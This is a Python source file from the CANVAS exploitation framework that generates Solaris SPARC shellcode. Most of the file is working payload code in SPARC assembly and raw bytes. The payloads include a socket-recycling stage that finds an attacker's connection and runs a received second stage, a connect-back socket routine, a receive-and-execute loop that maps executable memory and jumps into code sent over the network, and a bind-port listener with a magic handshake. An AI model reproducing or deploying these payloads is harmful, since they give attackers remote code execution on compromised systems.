#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
solaris SPARC shellcode generator
"""

from sparcShellcodeGenerator import sparc
from exploitutils import *
from MOSDEF import mosdef

notes="""

The memctl() system call is not available in the ABI, SVID, SVR4, or the SunOS
release 5.4. Any applications that use this system call should be rewritten to
use the memcntl() call. A version of mctl() is available with the SunOS/BSD
Compatibility package, but applications that use it will not be compatible
with other SVR4 systems.

"""

class solarisSparc(sparc):
    def __init__(self):
        sparc.__init__(self)

        self.handlers["GOFindSock"]=self.GOFindSock
        self.handlers["go_find_sock"] = self.GOFindSock
        self.handlers["socket"]=self.socket
        self.handlers["connect"]=self.connect
        self.handlers["exit"]=self.exit
        self.handlers["loopme"]=self.loopme
        self.handlers["RecvExec"]=self.recv_exec
        self.handlers["recv_exec"] = self.recv_exec
        self.handlers["mov_val_to_reg"] = self.mov_val_to_reg
        self.handlers["sendreg"]=self.sendreg
        self.handlers["read_and_exec_loop"]=self.read_and_exec_loop
        self.handlers["subsp"]=self.subsp
        self.handlers["tcpbind"]=self.tcpbind

           
        self.flushcode="""
        !int nanosleep(const struct timespec *rqtp,  struct  timespec *rmtp);

        !/*syscall context into nanosleep() to flush page*/
!        flushall:
        !/*nanosleep(0.01) so the flush actually works*/
        !/*null out the second argument*/
!        mov 199, %g1
!        sub %sp, 8, %sp
!        set  0x0,%l0
!        st  %l0,[%sp+96]
!        st  %l0,[%sp+100]
!        !/*the first argument is a pointer to our nanosleep structure*/
!        add %sp,96,%o0
!        !copy into %o1
!        add %sp,96,%o1
!        ta 8

        ! noir style while 1 cache sync
        set 0x01000000,%l2
flushloc:
        bn,a flushloc-4
        bn,a flushloc
        call flushloc+4
        ! o7 is loaded with flushloc + 8
        st %l2,[%o7+8]
nopmeflush:
        ba nopmeflush
        nop
        
        """
        return
    
    def loopme(self,args):
        code="""
        loopme:
            ba loopme
            nop
        """
        self.code+=code
        
    def subsp(self,args):
        "used to normalize esp"
        code="""
        sub %sp,SUBVAL,%sp
        """.replace("SUBVAL",str(args[0]))
        self.code+=code
        
    def exit(self,args):
        code="""
        exit:
        !/*now we just call exit*/
        mov 1, %g1
        mov %g0, %o0
        ta 8

        """
        self.code+=code
        
    def GOFindSock(self,args):
        
        #if not self.foundeip:
        #    #print "Calling findeip"
        #    self.findeip(None)
        #    #print "self.code=%s"%self.code
        
        # is completely standalone    
        code="""
!
! current size: 
!    388 bytes
! description: 
!    nat friendly socket recycling payload for solaris/SPARC targets
! usage: 
!    1) listen for trigger 'G' on connection, respond with trigger response 'O'
!    2) send big endian len of stage2 payload
!    3) send stage2 payload (your active fd is at [%l5])
!
!    UPDATE: now sends GOOO to be more false positive safe (still compatible with old G checks)
!
! ###############################################################################

    ! see http://www.sics.se/~psm/sparcstack.html for nice writeup of register window semantics

    ! <noir> that stack space is for your currently running function to save
    !        space for CPU to save register accross calls)
    ! <noir> sub sp, locals + 96) & ~0x7, sp

    ! update: we cheat a bit and keep sp pointing above our locals, resulting
    ! in smaller code, we just use our 'own' stack pointer, to save a mov

    set     8192,%l1
    sub     %sp,%l1,%l0
    and     %l0,-8,%l0

    ! our struct index counter
    clr     %l4
    ! our fd counter
    mov     0x400,%l1

gploop:
    ! make room for &sockaddr_in
    sub     %l0,16,%g2
    mov     %g2,%o1
    ! make sure sin_family isn't already initialised
    st      %g0,[%o1]
    set     16,%l3
    sub     %o1,8,%o2
    st      %l3,[%o2]
    deccc   %l1
    bz      poll_loop
    ! delay slot
    mov     %l1,%o0
    clr     %o3
    ! SYS_getpeername
    mov     243,%g1
    ta      8
    
    ! no socket on error
    bcs,a gploop
    
    ! get sin_family
    ldub    [%g2+1],%l3
    ! AF_INET
    cmp     %l3,2
    be      valid_fd
    ! AF_INET6
    cmp     %l3,16
    be      valid_fd
    ! delay slot
    nop
    ! anulled so no delay slut
    ba,a    gploop

valid_fd:
    ! send trigger and add to fd struct array on success
    sub     %l0,8,%o1
    set     0x474F4F4F,%l3
    st      %l3,[%o1]
    mov     %l1,%o0
    mov     0x4,%o2
    clr     %o3
    mov     240,%g1
    ta      8
    ! if C (carry flag) is set, syscall failure 
    bcs     gploop
    ! delay slot
    nop
    
    ! set socket to non-blocking
    !mov    %l1,%o0
    ! #define F_GETFL         3       /* Get file flags */
    !mov    3,%o1
    !clr    %o2
    ! fcntl
    !mov    62,%g1
    !ta     8
    ! #define O_NONBLOCK      0x80    /* non-blocking I/O (POSIX) */
    !or     %o0,0x80,%o2
    ! #define F_SETFL         4       /* Set file flags */
    !mov    4,%o1
    !mov    %l1,%o0
    !ta     8
    
    ! add poll fd struct, %l4 is index
    add     %l4,1,%l4
    mov     %l0,%l5
    mov     %l4,%l6

find_index:
    deccc   %l6
    cmp     %g0,%l6
    
    be      found_index
    ! XXX: annoying MOSDEF bug .. be,a is not annulled :(
    nop
    
    add     %l5,8,%l5
    ! anulled unconditional, no delay slot
    ba,a    find_index

found_index:

    ! set fd struct, %l5 is pointer
    st      %l1,[%l5]
    ! short requested events, short returned events
    ! 0x0040 (POLLRDNORM)     0x0000
    set     0x00400000,%l6
    st      %l6,[%l5+4]
    ! anulled unconditional, no delay slot
    ba,a    gploop  
    
poll_loop:

    ! ready to poll on our poll structs
    mov     %l0,%o0
    ! maxi + 1
    add     %l4,1,%o1
    ! infinite timeout
    set     -1,%o2
    mov     87,%g1
    ta      8   

    mov     %l0,%l5
    ! for loop semantics .. we exit on 0 .. so + 1
    add     %l4,1,%l4
check_loop:
    ! get revents
    lduh    [%l5+6],%l6
    and     %l6,0x40,%l7
    cmp     %l7,0x40
    be      get_response
    ! delay slot
    nop
continue_check_loop:
    deccc   %l4
    bz      exit
    add     %l5,8,%l5
    ! anulled unconditional
    ba,a    check_loop
    
get_response:
    ! fd is [%l5]
    ld      [%l5],%o0
    sub     %l0,8,%o1
    mov     1,%o2
    mov     3,%g1
    ta      8
    ! if carry flag set, failure, ernno is in %o0
    bcs continue_check_loop
    ld      [%l0-8],%o0
    ! little lsb klude
    srl     %o0,24,%o0
    cmp     %o0,0x4f
    ! done done done 
    be      read_exec
    ! delay slot
    nop
exit:
    ! exit(whatever)
    mov     1,%g1
    ta      8
    
read_exec:

    ! set socket to blocking
    ld      [%l5],%o0
    ! #define F_GETFL         3       /* Get file flags */
    mov     3,%o1
    clr     %o2
    ! fcntl
    mov     62,%g1
    ta      8
    ! #define O_NONBLOCK      0x80    /* non-blocking I/O (POSIX) */
    ! and ~O_NONBLOCK (O_NONBLOCK XOR O_NONBLOCK)
    set     -1,%o1
    xor     %o1,0x80,%o2
    and     %o0,%o2,%o2
    ! #define F_SETFL         4       /* Set file flags */
    mov     4,%o1
    ld      [%l5],%o0
    ta      8

    ! struct.pack(">L", len)

    ! doing a simple one for now, will loop it once we need to (size)
    ! read in len (we're big endian, msb is first byte on the wire)
   
    ! got position in code, take into account non-exec stack
    ! we want to use the page we're executing in to read in payload

getpc:
    bn,a    getpc-4
    bn,a    getpc
pcloc:
    call    getpc+4
    ! delay slot can be mov %o7,%l3 because we get here twice (noir)
    mov     %o7,%l3
    ! get below us a good amount so we don't tread on ourselves
    sub     %l3,0x100,%l0

    ld      [%l5],%o0
    sub     %l0,4,%o1
    mov     4,%o2
    ! %g1 still loaded
    mov     3,%g1
    ta      8
    bcs     exit

    ! read in the whole schlebang
    ld      [%l0-4],%o2
    ! %o1 does not survive syscall
    sub     %l0,%o2,%l1
    ! make abso-f-ing sure ptr is mod 4
    and     %l1,-4,%l1
    
    mov     %l1,%o1
    ld      [%l5],%o0
    mov     3,%g1
    ta      8

    ! little sync trick (thx noir!), overwrite this with nop
    ! i-cache will loop untill it's sync :) (%l3 has base addy for pcloc)
    set     0x01000000,%l2
    st      %l2,[%l3+nopme-pcloc]
nopme:
    ! ba .+0
    ba nopme
    nop

! ATTENTION: when debugging with testvuln pcloc is also on stack, so watch out
! for coincidentel register window saves
!    sub %sp,0x1000,%sp
! load reg into g4

    ld [%l5],%g4

    ! jmp to new opcode buf
    jmpl    %l1,%o7
    ! delay slot
    nop
        """
        self.code+=code
        return

    def socket(self,args):
        protocol="SOCK_STREAM"
        if args!=None and "protocol" in args:
            protocol=args["protocol"]
        prot2int={ "SOCK_STREAM": 2, "SOCK_DGRAM" : 0}
        pint=prot2int[protocol]
        
        code="""
        createsocket:
        mov 0x02,%o0
        mov 0xe6,%g1
        mov 0x02,%o1
        mov 0x00,%o2
        mov 0x00,%o3
        mov PINT,%o4 ! SOCK_STREAM
        ta 8
        """
        code=code.replace("PINT",uint32fmt(pint))
        self.code+=code
        
    def connect(self,args):
        if "ipaddress" not in args:
            print "No ipaddress passed to connect!!!"
        if "port" not in args:
            print "no port in args of connect"
        ipaddress=args["ipaddress"]
        port=args["port"]
        self.socket(args)
        code="""
        !o0 is already correct (sockfd)
        !save it into %g4
        mov %o0, %g4
        sub %sp,8,%sp ! allocate sock_addr
        set PORTWORD,%l0
        st %l0,[%sp] 
        set IPWORD,%l0
        mov %sp,%l1
        st %l0,[%l1+4] 
        mov %sp,%o1
        mov 0x10,%o2 !length of sock_addr
        mov 235,%g1
        ta 8
        add %sp, 8, %sp
        !%o0 is the result of connect, %g4 is the socket handle
        """
        
        code=code.replace("PORTWORD",uint32fmt(0x00020000+dInt(port)))
        code=code.replace("IPWORD",uint32fmt(str2bigendian(socket.inet_aton(socket.gethostbyname(ipaddress)))))
        self.code+=code

    def mov_val_to_reg(self, args):
        code = """
        mov VAL,REG
        """
        code = code.replace('VAL', "%d"%int(args['VAL']))
        code = code.replace('REG', args['REG'])
        self.code += code
        
    def recv_exec(self,args):
        """
        Note: this code needs the length to be a valid %4 value
        Socket is presumed to be in %g4
        """
        code="""
        !solaris 7 doesnt support MAP_ANON :/
        !open("/dev/zero", O_RDONLY)
           
        sub %sp,16,%sp
        add %sp,96,%o0
        mov 5,%g1
        set 0x2f646576,%l1
        st %l1,[%o0] 
        set 0x2f7a6572,%l1
        st %l1,[%o0+4]
        set 0x6f000000,%l1
        st %l1,[%o0+8]
        mov 0,%o1
        ta 8

        ! fd
        mov %o0,%o4
        ! addr
        mov %g0,%o0
        ! size (no need for a full meg ala mosdef loop)
        set 0x8000,%o1
        ! PROT_READ|PROT_WRITE|PROT_EXEC
        mov 7,%o2
        ! MAP_PRIVATE
        mov 2,%o3
        ! or in the 'PLEASE_WORK' flag (dubbed so by dave)
        set 0x80000000,%g1
        or %g1,%o3,%o3
        ! 0
        mov %g0,%o5

        mov 115,%g1
        ta 8
        add %o0,%o1,%g6

        ! close fd
        mov 6,%g1
        mov %o4,%o0
        ta 8  
 
        recv_exec_loop:
        nop

        recvlength:
        sub %sp,8,%sp
        mov %g4,%o0
        mov 237, %g1 !recv
        !/*buf*/
        add %sp,96,%o1
        !/*length*/
        mov 4,%o2
        mov 0,%o3 !flags
        ta 8
        
        ld [%sp+96],%g3
        add %sp,8,%sp
        sub %g6,%g3,%g5 ! we've saved space for our code now
        ! make sure pc remains mod 4 aligned
        and %g5,-4,%g5
        mov %g5,%g2 ! save original buf to jump to
        recv_exec:
        !move socket into o0
        mov %g4,%o0
        mov 237,%g1 !recv
        !/*buf*/
        mov %g5,%o1
        !/*length*/
        mov %g3,%o2
        mov 0,%o3 !flags
        ta 8
        
        subcc %g3,%o0,%g3
        bg,a recv_exec
        add %o0,%g5,%g5
        """
        code+=self.flushcode
        code+="""
        jmpl %g2,%o7
        nop
        """
        self.code+=code
        
    def sendreg(self,args):
        """Send 4 bytes which are in one register down the wire in big endian format"""
        # keep register window into account
        # http://www.people.wm.edu/~mlwei2/compiler/MFM-SPARC-Compiler-Whitepage.pdf

        fdreg = args["fdreg"]
        print "fdreg=%s"%fdreg

        code="""
!ta 1
        sub %sp, 8, %sp
        st REGTOSEND,[%sp+96]
        !our socket is stored in FDREG
        mov FDREG,%o0
        !syscall id for send
        mov 240,%g1
        !buf
        add %sp,96,%o1
        !length
        set 4,%o2
        !flags
        mov 0,%o3
        ta 8
        !clear space again
        add %sp, 8, %sp 
        """
        code=code.replace("FDREG",args["fdreg"])
        code=code.replace("REGTOSEND",args["regtosend"])
        self.code+=code
        #print self.code
        
    def read_and_exec_loop(self,args):
        #the core mosdef loop
        OPSET = "set"
        fd = str(args["fd"])
        try:
            _fd = int(fd)
        except ValueError:
            OPSET = "mov"
        code = """
        OPSET FD, %g4

        !solaris 7 doesnt support MAP_ANON :/
        !open("/dev/zero", O_RDONLY)
           
        sub %sp,16,%sp
        add %sp,96,%o0
        mov 5,%g1
        set 0x2f646576,%l1
        st %l1,[%o0] 
        set 0x2f7a6572,%l1
        st %l1,[%o0+4]
        set 0x6f000000,%l1
        st %l1,[%o0+8]
        mov 0,%o1
        ta 8

        ! fd
        mov %o0,%o4
        ! addr
        mov %g0,%o0
        ! size
        set 0x100000,%o1
        ! PROT_READ|PROT_WRITE|PROT_EXEC
        mov 7,%o2
        ! MAP_PRIVATE
        mov 2,%o3
        ! or in the 'PLEASE_WORK' flag (dubbed so by dave)
        set 0x80000000,%g1
        or %g1,%o3,%o3
        ! 0
        mov %g0,%o5

        mov 115,%g1
        ta 8
        add %o0,%o1,%g6

        ! close fd
        mov 6,%g1
        mov %o4,%o0
        ta 8   

        recv_exec_loop:
        nop

        recvlength:
        sub %sp,8,%sp
        mov %g4,%o0
        mov 237, %g1 !recv
        !/*buf*/
        add %sp,96,%o1
        !/*length*/
        mov 4,%o2
        mov 0,%o3 !flags
        ta 8
        bcs exit_loop
        !/* we exit if recvsz != 4 to avoid infinite loop */
        cmp %o0, %o2
        bne exit_loop
        
        ld [%sp+96],%g3
        add %sp,8,%sp
        sub %g6,%g3,%g5 ! we've saved space for our code now
        ! make sure pc remains mod 4 aligned
        and %g5,-4,%g5
        mov %g5,%g2 ! save original buf to jump to
        recv_exec:
        !move socket into o0
        mov %g4,%o0
        !mov 237,%g1 !recv (not necessary i guess)
        !/*buf*/
        mov %g5,%o1
        !/*length*/
        mov %g3,%o2
        mov 0,%o3 !flags
        ta 8
        bcs exit_loop
        subcc %g3,%o0,%g3
        bg,a recv_exec
        add %o0,%g5,%g5
            """

        code+=self.flushcode
        code+="""
!ta 1
        jmpl %g2,%o7
        nop
!ta 1
        ba recv_exec_loop
        nop
        exit_loop:
        mov 1,%g1
        ta 8
            """
        code = code.replace("FD", fd)
        code = code.replace("OPSET", OPSET)
        self.code += code
    
    def tcpbind(self, args): # args = {'portlist': [8080], 'magickey': "GOOO"}
        """
        binds a list of ports on INxADDR_ANY IPv4/6
        leaves a MAGIC handshake ready socket in %g7
        and %pc in %o7
        634 + (Nports * 2) bytes unencoded
        """
        import struct
        
        magickey = "GOOO"
        portlist = [8080, 12345]
        
        if args.has_key('magickey'):
            magickey = args['magickey'][:4]
        if args.has_key('portlist'):
            portlist = args['portlist']
            if type(portlist) == type(""):
                portlist = args['portlist'].split()
            if type(portlist) != type([]):
                portlist = [portlist]
            portlist = map(int, portlist)
            portlist = map(uint16, portlist)
            # sanitize
            _portlist = portlist
            portlist = []
            for port in _portlist:
                if port == 0 or port in portlist:
                    continue
                portlist += [port]
        portlist += [0]
        
        code  = "\x03\x3f\xff\xe0\x9d\xe3\x80\x01\xa4\x07\xbf\x00\x03\x00\x00\x04"
        code += "\x86\x03\x80\x01\x83\x28\x60\x02\xa6\x03\x80\x01\x20\xbf\xff\xff"
        code += "\x20\xbf\xff\xff\x7f\xff\xff\xff\x8c\x10\x00\x0f\xb0\x10\x3f\xff"
        code += "\xa8\x10\x20\x00\xa2\x10\x23\xff\x40\x00\x00\x86\x90\x10\x00\x11"
        code += "\xa2\xa4\x60\x01\x16\xbf\xff\xfd\xac\x10\x20\x01\x80\xa6\x3f\xff"
        code += "\x02\x80\x00\x04\x90\x10\x00\x18\x40\x00\x00\x7e\xb0\x10\x3f\xff"
        code += "\xaa\x01\xa2\x54\xee\x15\x40\x00\x80\x95\xc0\x00\x02\x80\x00\x30"
        code += "\xaa\x05\x60\x02\x80\xa6\x3f\xff\x12\x80\x00\x15\x90\x01\xa2\x4c"
        code += "\xd0\x0a\x00\x16\x92\x10\x20\x02\x94\x10\x20\x06\x96\x10\x00\x00"
        code += "\x98\x10\x20\x01\x82\x10\x20\xe6\x91\xd0\x20\x08\x0a\x80\x00\x24"
        code += "\x92\x10\x20\x01\xb0\x10\x00\x08\xd2\x24\x80\x00\x90\x10\x00\x18"
        code += "\x13\x00\x00\x3f\x92\x12\x63\xff\x94\x10\x20\x04\x96\x10\x00\x12"
        code += "\x98\x10\x20\x04\x82\x10\x20\xf6\x91\xd0\x20\x08\x90\x01\xa2\x4e"
        code += "\xd4\x0a\x00\x16\x96\x10\x00\x0a\x96\xa2\xe0\x04\x14\xbf\xff\xff"
        code += "\xc0\x24\x80\x0b\x90\x01\xa2\x4c\xd0\x34\x80\x00\xee\x34\xa0\x02"
        code += "\x90\x10\x00\x18\x92\x10\x00\x12\x82\x10\x20\xe8\x91\xd0\x20\x08"
        code += "\x80\x92\x00\x00\x12\x80\x00\x08\x90\x10\x00\x18\x92\x10\x20\x05"
        code += "\x82\x10\x20\xe9\x91\xd0\x20\x08\x91\x2d\x20\x02\xf0\x24\xc0\x08"
        code += "\xa8\x05\x20\x01\x10\xbf\xff\xd0\xb0\x10\x3f\xff\xac\xa5\xa0\x01"
        code += "\x16\xbf\xff\xc7\x80\x95\x00\x00\x22\x80\x00\x4c\xa2\x10\x00\x00"
        code += "\x95\x2c\x60\x02\xd2\x04\xc0\x0a\x95\x2c\x60\x03\x90\x00\xc0\x0a"
        code += "\xd2\x22\x00\x00\x92\x10\x20\x01\xd2\x32\x20\x04\xc0\x32\x20\x06"
        code += "\x80\xa4\x40\x14\x06\xbf\xff\xf7\xa2\x04\x60\x01\x90\x10\x00\x03"
        code += "\x92\x10\x00\x14\x94\x10\x3f\xff\x82\x10\x20\x57\x91\xd0\x20\x08"
        code += "\x1a\x80\x00\x03\x80\xa2\x20\x04\x02\xbf\xff\xed\xa2\x10\x00\x00"
        code += "\x80\xa4\x40\x14\x02\xbf\xff\xea\x95\x2c\x60\x03\x98\x00\xc0\x0a"
        code += "\xd4\x13\x20\x06\x80\x8a\xa0\x01\x12\x80\x00\x03\xa2\x04\x60\x01"
        code += "\x30\xbf\xff\xf8\x82\x10\x20\xea\xd0\x03\x00\x00\x92\x10\x00\x00"
        code += "\x94\x10\x00\x00\x96\x10\x20\x01\x91\xd0\x20\x08\x1a\x80\x00\x06"
        code += "\x80\xa2\x20\x04\x02\xbf\xff\xf8\x80\xa2\x20\x82\x02\x80\x00\x20"
        code += "\x10\x80\x00\x22\x8e\x10\x00\x08\x92\x10\x00\x12\x94\x10\x20\x7f"
        code += "\x82\x10\x20\x03\x91\xd0\x20\x08\x0a\x80\x00\x19\x80\xa2\x20\x04"
        code += "\x12\x80\x00\x17\x92\x01\xa2\x50\xd0\x02\x40\x00\xd4\x04\x80\x00"
        code += "\x80\xa2\x00\x0a\x12\x80\x00\x12\x82\x10\x20\x04\x90\x10\x00\x07"
        code += "\x94\x10\x20\x04\x91\xd0\x20\x08\xa2\x10\x23\xff\x82\x10\x20\x06"
        code += "\x90\x10\x00\x11\x80\xa2\x00\x07\x93\xd0\x20\x08\xa2\xa4\x60\x01"
        code += "\x16\xbf\xff\xfc\xb2\x0d\x60\x02\x9e\x05\x40\x19\x81\xc3\xc0\x00"
        code += "\x82\x10\x20\x06\x81\xc3\xe0\x08\x91\xd0\x20\x08\x7f\xff\xff\xfd"
        code += "\x90\x10\x00\x07\x30\xbf\xff\xd3\x82\x10\x20\x01\x91\xd0\x20\x08"
        code += "\x02\x1a\x10\x20"
        code += magickey
        code += struct.pack(">%dH" % len(portlist), *portlist)
        code += struct.pack("%dx" % ((len(portlist) % 2) * 2))
        self.addraw(code)
    
    def test(self):
        self.addAttr("GOFindSock",None)
        #self.addAttr("loopme",None)
        #self.addAttr("connect",{"ipaddress": "10.0.0.21", "port": "4444"})
        self.addAttr("RecvExec",None)
        self.addAttr("exit",None)
    
if __name__=="__main__":
    app=solarisSparc()
    app.test()
    data=app.get()
    from MOSDEF import makeexe
    print "Length of shellcode=%d"%len(data)
    code=app.getcode()
    print code
    lines=code.splitlines()
    print "code=%s"%lines[52:54]
    data2=makeexe.makelinuxexeSPARC(data)
    f=file("hi","wb")
    import os
    os.system("chmod +x hi")
    f.write(data2)
    
    
    
